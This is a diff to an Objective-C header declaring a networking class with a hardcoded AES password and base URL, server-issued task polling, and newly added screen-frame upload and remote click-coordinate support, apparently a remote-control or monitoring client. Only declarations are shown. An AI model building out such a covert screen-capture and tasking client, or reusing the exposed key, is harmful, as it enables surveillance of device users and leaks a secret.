@@ -7,12 +7,16 @@
 //    · /taskget /taskresult：任务轮询与回执
 //
 #import <Foundation/Foundation.h>
+#import <CoreGraphics/CoreGraphics.h>
 
 @interface Net : NSObject
 
 @property (nonatomic, copy) NSString *baseURL;      // https://xxx.icu
 @property (nonatomic, copy) NSString *aesPassword;  // Ek8pl31K2yeHgQwy
 @property (nonatomic, strong) NSDictionary *identity; // u/d/s/lhu/m/b 等
+
+/// 屏幕点尺寸（面板换算点击坐标用；0 表示未知）
+@property (nonatomic, assign) CGSize screenSize;
 
 + (instancetype)shared;
 
@@ -29,5 +33,8 @@
 
 /// 上报一个事件（/event），返回字典（里面可能有 tasks）
 - (NSDictionary *)sendEvent:(NSDictionary *)event;
+
+/// 上传一帧屏幕截图（multipart → /screen/frame）
+- (BOOL)uploadScreenFrame:(NSData *)jpeg;
 
 @end
